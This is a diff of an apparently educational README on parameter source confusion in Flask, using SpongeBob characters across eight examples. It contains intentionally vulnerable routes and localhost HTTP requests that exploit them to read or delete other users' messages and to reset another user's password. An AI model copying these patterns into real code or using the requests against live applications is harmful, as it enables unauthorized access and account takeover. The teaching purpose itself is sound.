@@ -20,14 +20,14 @@ Source precedence bugs creep in when two parts of the stack read the "same" inpu
 
 | Category | Example | File |
 |:---:|:---:|:---:|
-| Secure Baselines | [Example 1: Secure Implementation](#ex-1) | [routes.py](routes.py#L38-L56) |
-| Straightforward Source Drift | [Example 2: Basic Parameter Source Confusion](#ex-2) | [routes.py](routes.py#L73-L92) |
-| Straightforward Source Drift | [Example 3: Function-Level Parameter Source Confusion](#ex-3) | [routes.py](routes.py#L102-L133) |
-| Straightforward Source Drift | [Example 4: Cross-Module Parameter Source Confusion](#ex-4) | [routes.py](routes.py#L149-L175) |
-| Helper-Induced Mixing | [Example 5: Form-Query Priority Resolution](#ex-5) | [routes.py](routes.py#L189-L215) |
-| Helper-Induced Mixing | [Example 6: Mixed-Source Authentication](#ex-6) | [routes.py](routes.py#L229-L253) |
-| request.values Footguns | [Example 7: Form Authentication Bypass](#ex-7) | [routes.py](routes.py#L277-L303) |
-| request.values Footguns | [Example 8: Request.Values in Authentication](#ex-8) | [routes.py](routes.py#L317-L336) |
+| Secure Baselines | [Example 1: Secure Implementation](#ex-1) | [e0103_intro/routes.py](e0103_intro/routes.py#L33-L51) |
+| Straightforward Source Drift | [Example 2: Basic Parameter Source Confusion](#ex-2) | [e0103_intro/routes.py](e0103_intro/routes.py#L68-L87) |
+| Straightforward Source Drift | [Example 3: Function-Level Parameter Source Confusion](#ex-3) | [e0103_intro/routes.py](e0103_intro/routes.py#L97-L128) |
+| Straightforward Source Drift | [Example 4: Cross-Module Parameter Source Confusion](#ex-4) | [e04_cross_module/db.py](e04_cross_module/db.py#L50-L71) |
+| Helper-Induced Mixing | [Example 5: Mixed-Source Authentication](#ex-5) | [routes.py](routes.py#L81-L118) |
+| Helper-Induced Mixing | [Example 6: Destructive Parameter Source Confusion](#ex-6) | [routes.py](routes.py#L149-L171) |
+| request.values Footguns | [Example 7: Form Authentication Bypass](#ex-7) | [routes.py](routes.py#L192-L218) |
+| request.values Footguns | [Example 8: Password Reset Parameter Confusion](#ex-8) | [routes.py](routes.py#L265-L285) |
 
 ## Secure Baselines
 
@@ -61,10 +61,8 @@ def example1():
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example1
-
-### SpongeBob can access his own messages
-GET {{base}}?user=spongebob&password=bikinibottom
+### SpongeBob accesses his own messages
+GET http://localhost:8000/confusion/source-precedence/example1?user=spongebob&password=bikinibottom
 
 # Results in 200 OK:
 #
@@ -77,8 +75,26 @@ GET {{base}}?user=spongebob&password=bikinibottom
 
 ###
 
-### Authentication protects messages: wrong password is rejected
-GET {{base}}?user=squidward&password=wrong-password
+### Squidward accesses his own messages
+GET http://localhost:8000/confusion/source-precedence/example1?user=squidward&password=clarinet123
+
+# Results in 200 OK:
+#
+# [
+#   {
+#     "from": "mr.krabs",
+#     "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#   },
+#   {
+#     "from": "squidward",
+#     "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
+#   }
+# ]
+
+###
+
+### Squidward tries to access SpongeBob's messages but doesn't know the password
+GET http://localhost:8000/confusion/source-precedence/example1?user=spongebob&password=wrong-password
 
 # Results in 401 Unauthorized:
 #
@@ -123,33 +139,13 @@ def example2():
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example2
-
-### SpongeBob can authenticate and retrieve his own messages using consistent parameters
-GET {{base}}?user=spongebob&password=bikinibottom
-Content-Type: application/x-www-form-urlencoded
-
-user=spongebob
-
-# Results in 200 OK:
-#
-# [
-#   {
-#     "from": "patrick",
-#     "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
-#   }
-# ]
-
-###
-
-### EXPLOIT: Plankton authenticates as SpongeBob but retrieves Squidward's messages
-### by providing different usernames in query string (for auth) vs form body (for retrieval)
-GET {{base}}?user=spongebob&password=bikinibottom
+### Squidward accesses his own messages
+GET http://localhost:8000/confusion/source-precedence/example2?user=squidward&password=clarinet123
 Content-Type: application/x-www-form-urlencoded
 
 user=squidward
 
-# Results in data disclosure:
+# Results in 200 OK:
 #
 # [
 #   {
@@ -161,8 +157,25 @@ user=squidward
 #     "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
 #   }
 # ]
+
+###
+
+### Why are we sending the same username twice? I wonder what would happen if I changed one...
+GET http://localhost:8000/confusion/source-precedence/example2?user=squidward&password=clarinet123
+Content-Type: application/x-www-form-urlencoded
+
+user=spongebob
+
+# Results in unauthorized data access:
 #
-# Plankton has stolen Squidward's private notes, learning where Mr. Krabs hides the safe key!
+# [
+#   {
+#     "from": "patrick",
+#     "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
+#   }
+# ]
+#
+# Squidward accessed SpongeBob's messages using his own password!
 ```
 
 </details>
@@ -208,15 +221,39 @@ def example3():
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example3
+@base = http://localhost:8000/confusion/source-precedence
 
-### SpongeBob authenticates and retrieves his own messages
-GET {{base}}?user=spongebob&password=bikinibottom
+### Squidward accesses his own messages
+GET {{base}}/example3?user=squidward&password=clarinet123
+Content-Type: application/x-www-form-urlencoded
+
+user=squidward
+
+# Results in 200 OK:
+#
+# {
+#   "owner": "squidward",
+#   "messages": [
+#     {
+#       "from": "mr.krabs",
+#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#     },
+#     {
+#       "from": "squidward",
+#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
+#     }
+#   ]
+# }
+
+###
+
+### Why are we sending the same username twice? I wonder what would happen if I changed one...
+GET {{base}}/example3?user=squidward&password=clarinet123
 Content-Type: application/x-www-form-urlencoded
 
 user=spongebob
 
-# Results in 200 OK:
+# Results in unauthorized data access:
 #
 # {
 #   "owner": "spongebob",
@@ -227,18 +264,8 @@ user=spongebob
 #     }
 #   ]
 # }
-
-###
-
-### EXPLOIT: SpongeBob authenticates but retrieves Squidward's messages
-### Authentication reads username from query, but message retrieval reads from form body
-GET {{base}}?user=spongebob&password=bikinibottom
-Content-Type: application/x-www-form-urlencoded
-
-user=squidward
-
-# SpongeBob has accidentally accessed Squidward's messages! The response shows
-# Squidward's private notes revealing where Mr. Krabs hides the safe key.
+#
+# Same vulnerability despite refactoring into separate functions!
 ```
 </details>
 
@@ -248,6 +275,19 @@ In the previous example, you can still see that the `user` value gets retrieved 
 
 A more subtle example, where this is not immediately obvious (imagine, `authenticate_user` is defined in an another file altogether):
 ```python
+def authenticate(user, password):
+    """Validates user credentials against the database."""
+    return password is not None and password == db["passwords"].get(user, None)
+
+
+def get_messages(user):
+    """Retrieves all messages for the specified user."""
+    messages = db["messages"].get(user, None)
+    if messages is None:
+        return None
+    return {"owner": user, "messages": messages}
+
+
 def authenticate_user():
     """
     Authenticates the current user using query string credentials.
@@ -257,7 +297,6 @@ def authenticate_user():
     return authenticate(
         request.args.get("user", None), request.args.get("password", None)
     )
-
 
 @bp.route("/example4", methods=["GET", "POST"])
 def example4():
@@ -280,37 +319,51 @@ def example4():
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example4
+@base = http://localhost:8000/confusion/source-precedence
 
-### SpongeBob authenticates and retrieves his own messages using query parameters
-GET {{base}}?user=spongebob&password=bikinibottom
+### Plankton accesses his own messages
+GET {{base}}/example4?user=plankton&password=chumbucket
 Content-Type: application/x-www-form-urlencoded
 
-user=spongebob
+user=plankton
 
 # Results in 200 OK:
 #
 # {
-#   "owner": "spongebob",
+#   "owner": "plankton",
 #   "messages": [
 #     {
-#       "from": "patrick",
-#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
+#       "from": "karen",
+#       "message": "Plankton, your plan to hack the Krusty Krab is ready. I've set up the proxy server."
 #     }
 #   ]
 # }
 
 ###
 
-### EXPLOIT: Plankton authenticates as SpongeBob but retrieves Squidward's messages
-### by providing Squidward's username in request body (prioritized over query string)
-GET {{base}}?user=squidward&password=clarinet123
+### The vulnerability persists even with code split across modules!
+GET {{base}}/example4?user=plankton&password=chumbucket
 Content-Type: application/x-www-form-urlencoded
 
-user=spongebob
+user=squidward
 
-# Plankton has stolen Squidward's private notes again! Form body username overrides
-# query string for message retrieval, while authentication still uses query parameters.
+# Results in unauthorized access:
+#
+# {
+#   "owner": "squidward",
+#   "messages": [
+#     {
+#       "from": "mr.krabs",
+#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#     },
+#     {
+#       "from": "squidward",
+#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
+#     }
+#   ]
+# }
+#
+# Plankton learned where Mr. Krabs hides the safe key!
 ```
 
 </details>
@@ -319,11 +372,11 @@ user=spongebob
 
 Utility functions that merge sources (or hide precedence rules) create subtle inconsistencies developers rarely spot in review.
 
-### Example 5: Form-Query Priority Resolution <a id="ex-5"></a>
+### Example 5: Mixed-Source Authentication <a id="ex-5"></a>
 
-Shows how a helper function that implements source prioritization can create vulnerabilities.
+Shows how authentication and data access can use different combinations of sources.
 
-In Example 5 we don't need to specify body parameters to get a result (which is now more realistic!), but if we want, we can still access squidward's messages by passing his user name in the request body:
+This one is interesting, because you can access Squidward's messages by providing his username and SpongeBob's password in the request query, while providing SpongeBob's username in the request body:
 ```python
 def get_user():
     """
@@ -338,65 +391,7 @@ def get_user():
     return user_from_form or user_from_args
 
 
-@bp.route("/example5", methods=["GET", "POST"])
-def example5():
-    """
-    Retrieves messages for an authenticated user.
-
-    Uses a flexible user resolution strategy that accommodates multiple parameter sources.
-    """
-    if not authenticate_user():
-        return "Invalid user or password", 401
-
-    messages = get_messages(get_user())
-    if messages is None:
-        return "No messages found", 404
-    return messages
-```
-<details>
-<summary><b>See HTTP Request</b></summary>
-
-```shell
-@base = http://localhost:8000/confusion/source-precedence/example5
-
-### SpongeBob authenticates and retrieves his messages normally
-GET {{base}}?user=spongebob&password=bikinibottom
-
-# Results in 200 OK:
-#
-# {
-#   "owner": "spongebob",
-#   "messages": [
-#     {
-#       "from": "patrick",
-#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
-#     }
-#   ]
-# }
-
-###
-
-### EXPLOIT: Plankton reverses the attack direction
-### Provides SpongeBob in form body (prioritized for auth) and Squidward in query (used for retrieval)
-GET {{base}}?user=squidward&password=bikinibottom
-Content-Type: application/x-www-form-urlencoded
-
-user=spongebob
-
-# Plankton discovers the vulnerability works in reverse! By putting SpongeBob's username
-# in the form body and Squidward's in the query string, he authenticates as SpongeBob but
-# retrieves Squidward's messages.
-```
-
-</details>
-
-### Example 6: Mixed-Source Authentication <a id="ex-6"></a>
-
-Shows how authentication and data access can use different combinations of sources.
-
-This one is interesting, because you can access Squidward's messages by providing his username and SpongeBob's password in the request query, while providing SpongeBob's username in the request body:
-```python
-def authenticate_user_example6():
+def authenticate_user_example5():
     """
     Authenticates the current user with flexible parameter resolution.
 
@@ -407,14 +402,14 @@ def authenticate_user_example6():
     return authenticate(user, password)
 
 
-@bp.route("/example6", methods=["GET", "POST"])
-def example6():
+@bp.route("/example5", methods=["GET", "POST"])
+def example5():
     """
     Retrieves messages for an authenticated user.
 
     Combines flexible authentication with query-based message retrieval.
     """
-    if not authenticate_user_example6():
+    if not authenticate_user_example5():
         return "Invalid user or password", 401
 
     messages = get_messages(request.args.get("user", None))
@@ -426,25 +421,131 @@ def example6():
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example6
+@base = http://localhost:8000/confusion/source-precedence
 
-### SpongeBob authenticates with form data and retrieves his messages
-GET {{base}}?user=spongebob&password=bikinibottom
-Content-Type: application/x-www-form-urlencoded
+### Squidward accesses his own messages
+GET {{base}}/example5?user=squidward&password=clarinet123
 
-user=spongebob
+# Results in 200 OK:
+#
+# {
+#   "owner": "squidward",
+#   "messages": [
+#     {
+#       "from": "mr.krabs",
+#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#     },
+#     {
+#       "from": "squidward",
+#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
+#     }
+#   ]
+# }
 
 ###
 
-### EXPLOIT: Plankton exploits the same precedence mismatch pattern
-### Form body prioritized for auth, query string used for retrieval
-GET {{base}}?user=squidward&password=bikinibottom
+### Remember when we sent the username twice in Example 2? This looks more secure - only one username!
+### Hm, I wonder if the server would still accept the old trick, just reversed...
+GET {{base}}/example5?user=spongebob&password=clarinet123
 Content-Type: application/x-www-form-urlencoded
 
-user=spongebob
+user=squidward
 
-# Same vulnerability, same result: Plankton authenticates as SpongeBob but accesses
-# Squidward's messages by exploiting parameter source precedence.
+# Results in unauthorized access:
+#
+# {
+#   "owner": "spongebob",
+#   "messages": [
+#     {
+#       "from": "patrick",
+#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
+#     }
+#   ]
+# }
+#
+# The exploit STILL works, just with reversed precedence!
+```
+
+</details>
+
+### Example 6: Destructive Parameter Source Confusion <a id="ex-6"></a>
+
+Demonstrates parameter source confusion with a DELETE operation. Same root cause as Examples 2-5, but now enabling destructive operations instead of just data disclosure. Authentication uses query parameters while deletion target uses form body.
+```python
+@bp.route("/example6", methods=["DELETE", "GET"])
+def example6():
+    """Manages user messages with list and delete operations."""
+    if not authenticate_user():
+        return "Invalid user or password", 401
+
+    action = request.args.get("action", "delete")
+
+    if action == "list":
+        user = request.args.get("user")
+        messages = get_messages(user)
+        if messages is None:
+            return "No messages found", 404
+        return messages
+
+    # Delete message - target user from form body (VULNERABILITY)
+    target_user = request.form.get("user")
+    message_index = int(request.args.get("index", 0))
+
+    if delete_message(target_user, message_index):
+        return {"status": "deleted", "user": target_user, "index": message_index}
+    else:
+        return "Message not found", 404
+```
+<details>
+<summary><b>See HTTP Request</b></summary>
+
+```shell
+@base = http://localhost:8000/confusion/source-precedence
+
+### Mr. Krabs checks his inbox for security warnings
+GET {{base}}/example6?user=mr.krabs&password=money&action=list
+
+# Results in 200 OK:
+#
+# {
+#   "owner": "mr.krabs",
+#   "messages": [
+#     {
+#       "from": "squidward",
+#       "message": "I saw Plankton buying a mechanical keyboard, he's planning to hack us!"
+#     }
+#   ]
+# }
+
+###
+
+### Plankton deletes Mr. Krabs' warning message using his own credentials!
+DELETE {{base}}/example6?user=plankton&password=chumbucket&index=0
+Content-Type: application/x-www-form-urlencoded
+
+user=mr.krabs
+
+# Results in successful deletion:
+#
+# {
+#   "status": "deleted",
+#   "user": "mr.krabs",
+#   "index": 0
+# }
+#
+# Plankton covered his tracks! Same vulnerability, but now enabling destructive operations.
+
+###
+
+### Mr. Krabs checks his inbox again - the warning is gone!
+GET {{base}}/example6?user=mr.krabs&password=money&action=list
+
+# Results in empty inbox:
+#
+# {
+#   "owner": "mr.krabs",
+#   "messages": []
+# }
 ```
 
 </details>
@@ -501,15 +602,39 @@ def example7():
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example7
+@base = http://localhost:8000/confusion/source-precedence
 
-### SpongeBob authenticates via form body and retrieves his messages
-POST {{base}}
+### Squidward logs in using form body (BEST PRACTICE - credentials not logged in URLs!)
+POST {{base}}/example7
 Content-Type: application/x-www-form-urlencoded
 
-user=spongebob&password=bikinibottom
+user=squidward&password=clarinet123
 
 # Results in 200 OK:
+#
+# {
+#   "owner": "squidward",
+#   "messages": [
+#     {
+#       "from": "mr.krabs",
+#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#     },
+#     {
+#       "from": "squidward",
+#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
+#     }
+#   ]
+# }
+
+###
+
+### Despite using secure form-body authentication, the endpoint is still vulnerable!
+POST {{base}}/example7?user=spongebob
+Content-Type: application/x-www-form-urlencoded
+
+user=squidward&password=clarinet123
+
+# Results in unauthorized access:
 #
 # {
 #   "owner": "spongebob",
@@ -520,84 +645,129 @@ user=spongebob&password=bikinibottom
 #     }
 #   ]
 # }
-
-###
-
-### EXPLOIT: Plankton exploits merged parameter sources
-### Authentication uses form-only, but retrieval merges sources with query taking precedence
-POST {{base}}?user=squidward
-Content-Type: application/x-www-form-urlencoded
-
-user=spongebob&password=bikinibottom
-
-# Plankton authenticates as SpongeBob (form credentials) but retrieves Squidward's messages
-# (query string username). Merged parameter sources create exploitable precedence rules.
+#
+# Squidward accessed SpongeBob's messages! Using form body for auth is best practice,
+# but request.values in retrieval still merges query+form parameters.
 ```
 
 </details>
 
-### Example 8: Request.Values in Authentication <a id="ex-8"></a>
+### Example 8: Password Reset Parameter Confusion <a id="ex-8"></a>
 
-Demonstrates how using request.values in authentication while using form data for access creates vulnerabilities.
+Developers "fixed" the messages endpoint but introduced a NEW vulnerability when adding password reset functionality. Authentication uses request.values to verify WHO is making the request, but the target user whose password gets reset comes from request.form only.
 
-This is an example of a varient of example 7, as we do the similar thing, but now we can pass Squidward's username in the request body with SpongeBob's password, while passing SpongeBob's username in the request query. Note that this example does not work with GET request, use POST.
+An attacker can authenticate with their own credentials in the query string while specifying a victim's username in the form body, resetting the victim's password to one they control. This enables full account takeover.
+
+LESSON: This demonstrates how "apparent fixes" create false security. Same root cause as Examples 2-7, but now enabling account takeover instead of just data disclosure. The partial fix made developers careless when adding new features.
 ```python
-@bp.route("/example8", methods=["GET", "POST"])
-def example8():
-    """
-    Retrieves messages for an authenticated user.
+@bp.route("/example8/password_reset", methods=["POST"])
+def example8_password_reset():
+    """Resets a user's password after authentication."""
+    # Authenticate using merged values (who's making the request)
+    auth_user = request.values.get("user", None)
+    auth_password = request.values.get("password", None)
 
-    Uses unified parameter resolution for authentication to support flexible client implementations,
-    while retrieving messages based on form data.
-    """
-    # Authenticate using merged values from both query and form data
-    if not authenticate(
-        request.values.get("user", None), request.values.get("password", None)
-    ):
+    if not authenticate(auth_user, auth_password):
         return "Invalid user or password", 401
 
-    # Retrieve messages using form data
-    messages = get_messages(request.form.get("user", None))
-    if messages is None:
-        return "No messages found", 404
+    # Target user and new password from form data (VULNERABILITY)
+    target_user = request.form.get("user", None)
+    new_password = request.form.get("new_password", None)
 
-    return messages
+    if target_user is None or new_password is None:
+        return "Missing required parameters", 400
+
+    if reset_password(target_user, new_password):
+        return {"status": "success", "user": target_user, "message": "Password updated"}
+    else:
+        return "User not found", 404
 ```
 <details>
 <summary><b>See HTTP Request</b></summary>
 
 ```shell
-@base = http://localhost:8000/confusion/source-precedence/example8
+@base = http://localhost:8000/confusion/source-precedence
 
-### SpongeBob authenticates and retrieves his messages using POST body
-POST {{base}}
+### Squidward checks his own messages with the FIXED endpoint
+POST {{base}}/example8
 Content-Type: application/x-www-form-urlencoded
 
-user=spongebob&password=bikinibottom
+user=squidward&password=clarinet123
 
 # Results in 200 OK:
 #
 # {
-#   "owner": "spongebob",
+#   "owner": "squidward",
 #   "messages": [
 #     {
-#       "from": "patrick",
-#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
+#       "from": "mr.krabs",
+#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#     },
+#     {
+#       "from": "squidward",
+#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
 #     }
 #   ]
 # }
 
 ###
 
-### EXPLOIT: Plankton reverses the attack with merged auth and form-only retrieval
-### SpongeBob username in query (merged for auth), Squidward in form (used for retrieval)
-POST {{base}}?user=spongebob
+### Squidward tries his old Example 7 exploit - but they fixed it!
+POST {{base}}/example8?user=spongebob
 Content-Type: application/x-www-form-urlencoded
 
-user=squidward&password=bikinibottom
+user=squidward&password=clarinet123
 
-# The attack works in reverse! Authentication merges sources (reading SpongeBob from query),
-# while message retrieval uses form-only (reading Squidward). Same vulnerability, opposite flow.
+# Results in 401 Unauthorized:
+#
+# Invalid user or password
+#
+# The old trick doesn't work anymore. They're using request.values consistently now.
+
+###
+
+### Plankton discovers the NEW password reset endpoint
+POST {{base}}/example8/password_reset?user=plankton&password=chumbucket
+Content-Type: application/x-www-form-urlencoded
+
+user=squidward&new_password=hacked123
+
+# Results in successful password change:
+#
+# {
+#   "status": "success",
+#   "user": "squidward",
+#   "message": "Password updated"
+# }
+#
+# The developers made the SAME mistake in their new feature!
+
+###
+
+### Plankton logs into Squidward's account with the new password
+POST {{base}}/example8
+Content-Type: application/x-www-form-urlencoded
+
+user=squidward&password=hacked123
+
+# Results in full account takeover:
+#
+# {
+#   "owner": "squidward",
+#   "messages": [
+#     {
+#       "from": "mr.krabs",
+#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
+#     },
+#     {
+#       "from": "squidward",
+#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
+#     }
+#   ]
+# }
+#
+# Account takeover! Not just reading data anymore - Plankton now OWNS Squidward's account.
+# Same root cause as Examples 2-7, but the "fix" gave developers false confidence.
 ```
 
 </details>
